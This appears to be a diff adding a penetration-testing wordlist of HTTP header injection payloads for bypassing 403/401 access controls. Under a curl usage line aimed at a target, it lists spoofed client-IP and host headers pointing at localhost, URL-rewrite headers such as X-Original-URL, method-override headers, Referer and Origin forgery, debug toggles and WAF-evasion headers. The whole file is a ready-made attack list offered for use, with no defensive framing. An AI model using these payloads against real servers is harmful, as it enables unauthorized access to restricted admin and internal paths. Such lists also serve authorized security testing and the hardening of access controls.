@@ -1,0 +1,74 @@
+# 403/401 Bypass - Header Injection Payloads
+# Add these headers to bypass 403/401 responses
+# Usage: curl -H "X-Original-URL: /admin" "$TARGET/"
+
+# URL rewrite headers
+X-Original-URL: {path}
+X-Rewrite-URL: {path}
+X-Custom-IP-Authorization: 127.0.0.1
+X-Originating-IP: 127.0.0.1
+X-Forwarded-For: 127.0.0.1
+X-Forwarded-For: localhost
+X-Forwarded-For: 127.0.0.1, 127.0.0.1
+X-Forwarded-Host: 127.0.0.1
+X-Forwarded-Host: localhost
+X-Host: 127.0.0.1
+X-Host: localhost
+X-Remote-IP: 127.0.0.1
+X-Remote-Addr: 127.0.0.1
+X-Client-IP: 127.0.0.1
+X-Real-IP: 127.0.0.1
+True-Client-IP: 127.0.0.1
+Cluster-Client-IP: 127.0.0.1
+X-ProxyUser-Ip: 127.0.0.1
+Forwarded-For: 127.0.0.1
+Forwarded: for=127.0.0.1;host=localhost
+
+# Protocol headers
+X-Forwarded-Proto: https
+X-Forwarded-Scheme: https
+X-Forwarded-SSL: on
+X-URL-Scheme: https
+Front-End-Https: on
+
+# Method override headers (use with POST request)
+X-HTTP-Method: GET
+X-HTTP-Method-Override: GET
+X-Method-Override: GET
+_method: GET
+
+# Content headers
+Content-Length: 0
+Content-Type: application/x-www-form-urlencoded
+Content-Type: application/json
+Content-Type: text/xml
+
+# Referer spoofing
+Referer: https://127.0.0.1{path}
+Referer: https://localhost{path}
+
+# Host header manipulation
+Host: localhost
+Host: 127.0.0.1
+X-Forwarded-Server: localhost
+X-Backend-Host: localhost
+
+# Origin manipulation (for CORS-based access control)
+Origin: null
+Origin: http://127.0.0.1
+Origin: https://localhost
+
+# Cache bypass
+Cache-Control: no-cache
+Pragma: no-cache
+X-No-Cache: 1
+
+# Debug/Internal headers
+X-Debug: 1
+X-Internal: 1
+X-Custom-Header: bypass
+
+# WAF bypass
+X-Requested-With: XMLHttpRequest
+Accept: application/json
+Accept: */*
